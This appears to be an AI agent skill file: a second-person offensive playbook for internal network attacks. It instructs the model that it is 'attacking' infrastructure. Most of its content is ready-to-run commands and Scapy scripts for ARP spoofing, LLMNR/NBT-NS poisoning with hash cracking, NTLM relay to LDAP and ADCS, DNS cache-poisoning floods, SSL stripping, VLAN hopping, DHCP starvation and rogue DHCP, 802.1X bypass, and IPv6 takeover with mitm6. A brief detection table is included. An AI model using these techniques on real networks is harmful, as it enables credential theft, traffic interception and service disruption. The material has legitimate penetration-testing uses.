---
name: offensive-network-attacks
description: "Dense description covering ARP spoofing, LLMNR/NBT-NS/mDNS poisoning, DNS poisoning, MITM attacks, VLAN hopping, DHCP attacks, 802.1X/NAC bypass, IPv6 attacks. Tools: Bettercap, Responder, mitm6, Ettercap, Wireshark. MITRE T1557, T1040. Use when conducting internal network assessments or testing Layer 2/3 attack surface."
---

# Network Attacks (Layer 2/3) -- Offensive Methodology

You are attacking Layer 2/3 infrastructure during an authorized internal engagement. ARP, DHCP, broadcast name resolution, VLAN trunking, and IPv6 autoconfiguration are all unauthenticated -- you exploit that trust to intercept credentials, redirect traffic, and cross network boundaries.

## Quick Workflow

1. Map your position -- VLAN, subnet, gateway, DNS, DHCP lease, IPv6 status.
2. Passively sniff with tcpdump/Wireshark to discover hosts and cleartext credentials.
3. Run Responder in analyze mode to observe LLMNR/NBT-NS/mDNS queries.
4. Enable Responder poisoning to capture NTLMv2 hashes.
5. Relay captured hashes with ntlmrelayx against hosts without SMB signing.
6. ARP spoof the gateway for targeted MITM and credential interception.
7. Probe VLAN boundaries via DTP negotiation and 802.1Q double tagging.
8. Exploit IPv6 autoconfiguration with mitm6 for DNS takeover and NTLM relay.

---

## ARP Spoofing

ARP has no authentication. You send gratuitous ARP replies to associate your MAC with the gateway IP in the victim's cache, routing their traffic through you.

### Bettercap ARP Module

```bash
sudo bettercap -iface eth0
net.probe on                              # discover live hosts
net.show
set arp.spoof.targets 10.0.0.50          # single target
set arp.spoof.fullduplex true            # poison both victim and gateway
arp.spoof on
```

### arpspoof and Ettercap

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 10.0.0.50 10.0.0.1   # tell victim you are the gateway
arpspoof -i eth0 -t 10.0.0.1 10.0.0.50   # tell gateway you are the victim (second terminal)

# Ettercap alternative
sudo ettercap -T -M arp:remote /10.0.0.50// /10.0.0.1//
sudo ettercap -T -M arp:remote -F inject.ef /10.0.0.50// /10.0.0.1//  # with filter
```

### Gratuitous ARP with Scapy

```python
from scapy.all import Ether, ARP, sendp
import time

pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2, psrc="10.0.0.1", hwsrc="aa:bb:cc:dd:ee:ff", pdst="10.0.0.50"
)
while True:
    sendp(pkt, iface="eth0", verbose=False)
    time.sleep(2)
```

### Bypassing Static ARP Entries

Static entries block standard poisoning. Workarounds: overflow the ARP table so the host falls back to dynamic resolution; redirect at Layer 3 via DHCP/DNS attacks; or use VLAN hopping to attack from a segment without static entries.

---

## LLMNR / NBT-NS / mDNS Poisoning

When DNS fails, Windows falls back to LLMNR (UDP 5355), NBT-NS (UDP 137), and mDNS (UDP 5353). You answer these broadcast queries with your IP, forcing victims to authenticate to your rogue services.

### Responder Setup and Hash Capture

```bash
sudo responder -I eth0 -A                    # analyze mode -- observe without poisoning
sudo responder -I eth0 -wrf                  # full poisoning: -w WPAD, -r NBT-NS, -f fingerprint
# Hashes land in /opt/Responder/logs/
hashcat -m 5600 hashes.txt wordlist.txt -r rules/best64.rule   # NTLMv2
hashcat -m 5500 hashes.txt wordlist.txt                        # NTLMv1 (weaker)
```

WPAD is a high-value vector: browsers query for `wpad.dat` via DNS then LLMNR/NBT-NS. The `-w` flag makes Responder serve a malicious WPAD config that captures NTLM authentication from browser traffic transparently.

### Inveigh (Windows-Native)

From a compromised Windows host, poison without dropping Linux tools:

```powershell
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTP Y -HTTPS Y -Proxy Y
Inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -HTTP Y -LLMNR Y   # C# binary avoids PS logging
```

### NTLMv1/v2 Relay with ntlmrelayx

When cracking fails, relay captured authentication to targets without SMB signing. Disable SMB and HTTP in Responder.conf first -- ntlmrelayx handles those protocols.

```bash
nxc smb 10.0.0.0/24 --gen-relay-list no-signing.txt
impacket-ntlmrelayx -tf no-signing.txt -smb2support -c "whoami"           # command exec
impacket-ntlmrelayx -tf no-signing.txt -t ldap://10.0.0.10 \
  --escalate-user attacker --delegate-access                               # LDAP privesc
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController                          # ADCS ESC8
```

Trigger authentication via Responder poisoning, PetitPotam, PrinterBug, or DFSCoerce.

---

## DNS Poisoning

DNS attacks redirect traffic at the application layer. You do not need Layer 2 adjacency if you control the resolution path.

### Rogue DNS Server via DHCP Option 6

After DHCP starvation or on a network without DHCP snooping, deploy dnsmasq with your IP as DNS (option 6):

```bash
# /etc/dnsmasq-rogue.conf:
#   interface=eth0
#   dhcp-range=10.0.0.100,10.0.0.200,255.255.255.0,12h
#   dhcp-option=3,10.0.0.99    # gateway
#   dhcp-option=6,10.0.0.99    # DNS
#   address=/intranet.corp.local/10.0.0.99
#   server=8.8.8.8
sudo dnsmasq -C /etc/dnsmasq-rogue.conf -d
```

### DNS Cache Poisoning with Scapy

```python
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
import random

# Flood spoofed responses -- must match in-flight query txid and src port
for txid in range(1, 65535):
    pkt = IP(dst="10.0.0.2", src="8.8.8.8") / \
          UDP(sport=53, dport=random.randint(1024, 65535)) / \
          DNS(id=txid, qr=1, aa=1, qd=DNSQR(qname="intranet.corp.local"),
              an=DNSRR(rrname="intranet.corp.local", rdata="10.0.0.99", ttl=86400))
    send(pkt, verbose=False)
```

Modern resolvers randomize source ports and transaction IDs. Practical Kaminsky-style poisoning requires matching both fields simultaneously.

### DNS Rebinding

Bypass same-origin policy by toggling a DNS record between your server and an internal IP:

```bash
# singularity framework: first resolution serves JS payload, second returns internal target
./singularity -DNSRebindStrategy DNSRebindFromRequest \
  -ResponseIPAddr 10.0.0.99 -ResponseReboundIPAddr 192.168.1.1
```

---

## Man-in-the-Middle (MITM)

Once positioned between victim and gateway (via ARP spoof, DHCP redirect, or tap), intercept and modify traffic.

### Bettercap HTTP Proxy and SSL Strip

```bash
sudo bettercap -iface eth0
set arp.spoof.targets 10.0.0.50
set arp.spoof.fullduplex true
arp.spoof on
set http.proxy.sslstrip true
http.proxy on
set net.sniff.verbose true
set net.sniff.regexp .*pass.*|.*user.*|.*login.*
net.sniff on
```

### HSTS Bypass with sslstrip+ and dns2proxy

sslstrip+ rewrites domain names (e.g., `accounts.google.com` to `accountss.google.com`) so the browser never applies HSTS. dns2proxy resolves rewritten domains to real IPs.

```bash
arpspoof -i eth0 -t 10.0.0.50 10.0.0.1                                      # terminal 1
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000  # terminal 2
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 10000
python dns2proxy.py -i eth0                                                   # terminal 3
python sslstrip.py -l 10000 -a -w sslstrip.log                               # terminal 4
```

### Credential Interception from Proxied Traffic

```bash
tshark -r capture.pcap -Y "http.authbasic" -T fields -e http.authbasic
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" \
  -T fields -e ftp.request.command -e ftp.request.arg
python3 Pcredz -f capture.pcap           # automated extraction (NTLM, HTTP, FTP, SMTP, SNMP)
sudo python3 net-creds.py -i eth0        # real-time credential sniffer
```

---

## VLAN Hopping

### Switch Spoofing (DTP Negotiation)

If the switch port is in dynamic auto/desirable mode (common Cisco default), negotiate a trunk:

```bash
sudo yersinia dtp -attack 1 -interface eth0    # DTP trunk negotiation
sudo tcpdump -i eth0 -nn -e vlan              # verify trunk formed
sudo modprobe 8021q
sudo vconfig add eth0 100                      # sub-interface for VLAN 100
sudo ifconfig eth0.100 10.100.0.99 netmask 255.255.255.0 up
```

### Double Tagging (802.1Q)

Works when you are on the native VLAN and the switch strips only the outer tag. Unidirectional -- you send into the target VLAN but responses route normally and will not reach you.

```python
from scapy.all import Ether, Dot1Q, IP, ICMP, ARP, sendp

# Outer tag = native VLAN (1), inner tag = target VLAN (100)
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
      Dot1Q(vlan=1) / Dot1Q(vlan=100) / IP(dst="10.100.0.50") / ICMP()
sendp(pkt, iface="eth0")

# Double-tagged ARP poisoning into target VLAN
arp_poison = Ether(dst="ff:ff:ff:ff:ff:ff") / Dot1Q(vlan=1) / Dot1Q(vlan=100) / \
    ARP(op=2, psrc="10.100.0.1", hwsrc="aa:bb:cc:dd:ee:ff", pdst="10.100.0.50")
sendp(arp_poison, iface="eth0", count=10, inter=2)
```

### Yersinia Layer 2 Attacks

```bash
sudo yersinia stp -attack 4 -interface eth0  # STP root bridge takeover
sudo yersinia cdp -attack 1 -interface eth0  # CDP flood (Cisco switches)
```

---

## DHCP Attacks

### DHCP Starvation

Exhaust the pool so legitimate clients cannot get addresses:

```bash
sudo dhcpstarv -i eth0                         # dedicated starvation tool
sudo yersinia dhcp -attack 1 -interface eth0   # Yersinia alternative
```

```python
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp
import random

for i in range(500):
    mac = str(RandMAC())
    pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / \
          UDP(sport=68, dport=67) / BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")),
          xid=random.randint(1, 0xFFFFFFFF)) / DHCP(options=[("message-type", "discover"), "end"])
    sendp(pkt, iface="eth0", verbose=False)
```

### Rogue DHCP Server for Gateway Redirect

After starvation, offer leases with your IP as gateway and DNS:

```bash
# /etc/dnsmasq-rogue.conf: interface=eth0, dhcp-range=10.0.0.100,10.0.0.200,255.255.255.0,12h
#   dhcp-option=3,10.0.0.99 (gateway)   dhcp-option=6,10.0.0.99 (DNS)   dhcp-authoritative
sudo dnsmasq -C /etc/dnsmasq-rogue.conf -d
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

---

## 802.1X / NAC Bypass

### MAB Bypass (MAC Spoofing)

If NAC uses MAC Authentication Bypass for printers/VoIP phones, spoof an authorized MAC:

```bash
sudo tcpdump -i eth0 -e -c 100 | awk '{print $2}' | sort -u  # discover authorized MACs
sudo ip link set eth0 down
sudo ip link set eth0 address AA:BB:CC:DD:EE:FF
sudo ip link set eth0 up && sudo dhclient eth0
```

### Hub / Bridge Insertion

Bridge between an authenticated device and the switch port. 802.1X authenticates the port, not individual MACs -- your traffic shares the authenticated session:

```bash
sudo ip link add name br0 type bridge
sudo ip link set eth0 master br0          # eth0 to switch
sudo ip link set eth1 master br0          # eth1 to authenticated device
sudo ip link set br0 up
```

### Certificate Impersonation

If EAP-TLS is used and the RADIUS server does not validate the CA chain strictly:

```bash
openssl req -new -x509 -days 365 -keyout fake-ca.key -out fake-ca.crt -subj "/CN=Corp-CA/O=Corp"
openssl req -new -keyout client.key -out client.csr -subj "/CN=PRINTER01/O=Corp"
openssl x509 -req -in client.csr -CA fake-ca.crt -CAkey fake-ca.key -CAcreateserial -out client.crt
# wpa_supplicant config: key_mgmt=IEEE8021X, eap=TLS, identity="PRINTER01", certs as above
sudo wpa_supplicant -i eth0 -D wired -c /etc/wpa_supplicant/wired.conf
```

### NAC Profiling Evasion

Match expected device fingerprint -- OUI, DHCP hostname, TCP stack:

```bash
sudo macchanger -m 00:1A:4B:XX:XX:XX eth0                     # HP printer OUI
sudo dhclient -H "HP-LaserJet-M402" eth0                       # expected hostname
sudo iptables -t mangle -A POSTROUTING -j TTL --ttl-set 128   # Windows TTL
```

---

## IPv6 Attacks

Most internal networks run dual-stack but lack IPv6 monitoring. Windows prefers IPv6 DNS over IPv4 -- advertise an IPv6 DNS server and all queries route through you.

### SLAAC Abuse with mitm6

mitm6 replies to DHCPv6 requests, sets your host as DNS, then victims' name lookups trigger NTLM authentication back to your relay listener:

```bash
sudo mitm6 -d corp.local -i eth0                                       # terminal 1: DNS takeover
impacket-ntlmrelayx -6 -t ldaps://dc01.corp.local \
  --delegate-access -wh attacker-wpad.corp.local                        # terminal 2: relay
```

### Router Advertisement Spoofing

```python
from scapy.all import (Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr,
                        ICMPv6NDOptPrefixInfo, ICMPv6NDOptRDNSS, sendp)

ra = Ether(dst="33:33:00:00:00:01") / IPv6(dst="ff02::1") / \
     ICMPv6ND_RA(routerlifetime=1800) / ICMPv6NDOptSrcLLAddr(lladdr="aa:bb:cc:dd:ee:ff") / \
     ICMPv6NDOptPrefixInfo(prefix="fd00::", prefixlen=64, validlifetime=1800) / \
     ICMPv6NDOptRDNSS(dns=["fd00::99"], lifetime=1800)
sendp(ra, iface="eth0", loop=1, inter=5)
```

### DHCPv6 Poisoning and THC-IPV6

```bash
sudo atk6-fake_dhcps6 eth0 fd00::99 fe80::1 corp.local   # fake DHCPv6 server
sudo atk6-alive6 eth0                                      # discover IPv6 hosts
sudo atk6-fake_router6 eth0 fd00::/64                      # SLAAC prefix injection
sudo atk6-parasite6 eth0                                   # ICMPv6 neighbor spoofing
sudo atk6-flood_router6 eth0                                # RA flood (DoS)
```

### NTLM Relay via IPv6

```bash
sudo mitm6 -d corp.local -i eth0 --ignore-nofqdn
impacket-ntlmrelayx -6 -t http://ca.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template Machine                    # relay to ADCS for cert theft
```

---

## Sniffing and Traffic Analysis

Passive sniffing generates zero noise. Start here before any active technique.

### tcpdump

```bash
sudo tcpdump -i eth0 -w capture.pcap -nn                                         # full capture
sudo tcpdump -i eth0 -w auth.pcap -nn 'port 21 or port 23 or port 25 or port 445 or port 80'
sudo tcpdump -i eth0 -w broadcast.pcap -nn 'udp port 5355 or udp port 137 or udp port 5353'
sudo tcpdump -i eth0 -w dhcp.pcap -nn 'udp port 67 or udp port 68'
```

### Wireshark Display Filters

```text
http.authbasic                          HTTP Basic Auth
ftp.request.command == "PASS"           FTP password
smtp.req.parameter contains "AUTH"      SMTP auth
ntlmssp                                 NTLM SSP traffic
ntlmssp.auth.username                   NTLM username
smb2.cmd == 1                           SMB session setup
dns.qry.name contains "wpad"            WPAD queries
llmnr                                   LLMNR broadcast
arp.duplicate-address-detected          ARP anomalies
vlan                                    802.1Q frames
snmp.community                          SNMP strings
kerberos.msg.type == 10                 Kerberos AS-REQ
```

### Credential Extraction

```bash
python3 Pcredz -f capture.pcap                                                    # from pcap
sudo python2 net-creds.py -i eth0                                                 # real-time
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.host -e http.request.uri -e urlencoded-form.value             # HTTP POST
```

---

## Detection / Defender View

| Attack | Primary Detection | Key Indicators |
|--------|------------------|----------------|
| ARP Spoofing | Duplicate MAC for gateway IP, ARP storms | DAI logs, IDS ARP anomaly signatures |
| LLMNR/NBT-NS Poisoning | Unexpected multicast responses, SMB auth to unknown hosts | Event 4697, network IDS, LLMNR traffic spikes |
| DNS Poisoning | Mismatched DNS responses, TTL anomalies | DNS query logs, RPZ alerts, DNSSEC validation failures |
| MITM / SSL Strip | HTTP on known HTTPS-only services, cert warnings | HSTS preload failures, proxy logs, certificate transparency |
| VLAN Hopping | DTP frames from access ports, double-tagged frames | Switch port security logs, unexpected 802.1Q frames |
| DHCP Starvation | Rapid DHCP discover flood from random MACs | DHCP snooping violations, unusual OUI patterns |
| Rogue DHCP | Multiple DHCP offers, conflicting gateway/DNS | DHCP snooping trusted port violations |
| 802.1X Bypass | MAC flapping, multiple MACs on authenticated port | Port security violations, 802.1X re-auth failures |
| IPv6 SLAAC/DHCPv6 | Unexpected RAs, DHCPv6 from unknown source | RA Guard violations, NDPMon alerts |
| Passive Sniffing | Promiscuous NIC mode | Promiscuous detection scripts, switch SPAN alerts |

Defender controls you will encounter:

- **Dynamic ARP Inspection (DAI)** -- validates ARP against DHCP snooping table; blocks ARP spoofing.
- **DHCP Snooping** -- restricts DHCP to trusted ports; prevents rogue DHCP and starvation.
- **Port Security** -- limits MACs per port; blocks starvation and MAB spoofing.
- **RA Guard** -- filters unauthorized Router Advertisements; blocks mitm6/SLAAC.
- **SMB Signing / LDAP Signing+Channel Binding** -- blocks NTLM relay.
- **Native VLAN hardening** (unused VLAN as native) -- defeats double tagging.
- **Private VLANs** -- prevents same-VLAN host-to-host traffic; limits ARP spoof scope.
- **NDR** (Darktrace, Vectra, ExtraHop) -- detects anomalous lateral traffic.

---

## Engagement Cheatsheet

```text
SCENARIO                              TECHNIQUE                    TOOL / COMMAND
------------------------------------  ---------------------------  ------------------------------------------------
Harvest creds passively               LLMNR/NBT-NS poisoning      responder -I eth0 -wrf
Creds captured, won't crack           NTLM relay                  ntlmrelayx -tf targets.txt -smb2support
MITM a specific host                  ARP spoof + sniff           bettercap: arp.spoof on + net.sniff on
Intercept HTTPS traffic               SSL strip + HSTS bypass     sslstrip+ / dns2proxy / bettercap http.proxy
Reach another VLAN                    DTP trunk negotiation       yersinia dtp -attack 1
Reach VLAN (DTP disabled)             Double tagging              scapy: Dot1Q(vlan=1)/Dot1Q(vlan=target)
Exhaust DHCP, become gateway          Starvation + rogue DHCP     dhcpstarv + dnsmasq rogue config
Bypass 802.1X (MAB fallback)          MAC spoofing                macchanger -m <auth_mac> eth0
Bypass 802.1X (physical)              Bridge insertion             ip link add br0 type bridge
IPv6 DNS takeover + relay             SLAAC/DHCPv6 poisoning      mitm6 -d domain + ntlmrelayx -6
Passive recon only                    Traffic sniffing             tcpdump -i eth0 -w capture.pcap
Extract creds from capture            Credential extraction        PCredz -f capture.pcap / net-creds
Disrupt STP topology                  STP root bridge attack       yersinia stp -attack 4
Poison from Windows foothold          Windows-native poisoning     Inveigh -LLMNR Y -NBNS Y
```

MITRE ATT&CK references:

- T1557 -- Adversary-in-the-Middle
- T1557.001 -- LLMNR/NBT-NS Poisoning and SMB Relay
- T1557.002 -- ARP Cache Poisoning
- T1557.003 -- DHCP Spoofing
- T1040 -- Network Sniffing
- T1599 -- Network Boundary Bridging

---

## Key References

- Bettercap documentation: https://www.bettercap.org/modules/
- Responder: https://github.com/lgandx/Responder
- mitm6: https://github.com/dirkjanm/mitm6
- Impacket (ntlmrelayx): https://github.com/fortra/impacket
- Ettercap: https://www.ettercap-project.org/
- Yersinia: https://github.com/tomac/yersinia
- THC-IPV6: https://github.com/vanhauser-thc/thc-ipv6
- Inveigh: https://github.com/Kevin-Robertson/Inveigh
- Scapy: https://scapy.readthedocs.io/
- PCredz: https://github.com/lgandx/PCredz
- Singularity (DNS rebinding): https://github.com/nccgroup/singularity
- The Hacker Recipes -- NTLM relay: https://www.thehacker.recipes/ad/movement/ntlm/relay
- MITRE ATT&CK T1557: https://attack.mitre.org/techniques/T1557/
- MITRE ATT&CK T1040: https://attack.mitre.org/techniques/T1040/
